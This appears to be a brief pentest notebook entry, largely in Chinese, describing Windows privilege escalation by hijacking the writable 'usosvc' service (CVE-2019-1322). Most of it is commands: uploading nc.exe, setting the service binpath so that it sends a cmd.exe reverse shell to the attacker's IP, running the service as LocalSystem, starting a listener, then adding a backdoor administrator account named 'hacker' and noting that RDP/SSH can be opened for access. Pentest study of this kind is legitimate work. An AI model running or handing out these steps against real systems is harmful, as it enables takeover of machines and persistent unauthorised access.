如果对某个服务拥有编辑的权限(winPEAS输出查看)，修改其执行路径指向我们的nc.exe，可以很快的实现提权。
Steps also described here: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#example-with-windows-10---cve-2019-1322-usosvc
*由系统服务弹回的shell会在几秒内关闭*
1. upload `nc.exe` to target
2. `sc config usosvc binpath= "C:\Inetpub\wwwroot\nc.exe -nv <kali_IP> 9988 -e C:\Windows\System32\cmd.exe"`
3. `sc config usosvc  obj= ".\LocalSystem" password= ""`
	* 因为无需二次使用，所以不设密码
4. `sc config usosvc start= "demand"`
5. `nc -lvp 9988` (setup listener on kali)
6. `net start usosvc`
**before privileged shell shuted**
```powershell
# add new user
net user hacker h@ck3r%93 /add
net localgroup administrators hacker /add
```
这时你可以添加RDP用户，开放RDP/SSH服务来连接该机器
#building 如何打开Windows主机的RDP/SSH服务